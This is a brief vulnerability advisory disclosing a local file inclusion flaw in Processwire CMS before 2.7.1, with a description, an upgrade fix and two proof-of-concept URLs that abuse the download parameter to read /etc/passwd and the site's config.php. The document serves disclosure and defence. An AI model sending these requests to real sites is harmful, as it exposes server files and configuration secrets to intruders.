# LFI-Processwire CMS
Local File Inclusion Processwire CMS < 2.7.1

Product: https://processwire.com/
Vendor: Processwire CMS
Tested version: 2.x < 2.7.1

** Description **
Local File Inclusion in Processwire CMS < 2.7.1 allows to
retrieve arbitrary files via the download parameter to index.php

By providing a specially crafted path to the vulnerable parameter, a remote attacker can retrieve the contents of sensitive files on the local system.

** Proof of Concept **
http://<host>/index.php?download=/etc/passwd
http://<host>/index.php?download=../config.php

** Solution **
Upgrade Processwire CMS to version 2.7.1 or later.
--
Best Regards,
Utku YILDIRIM
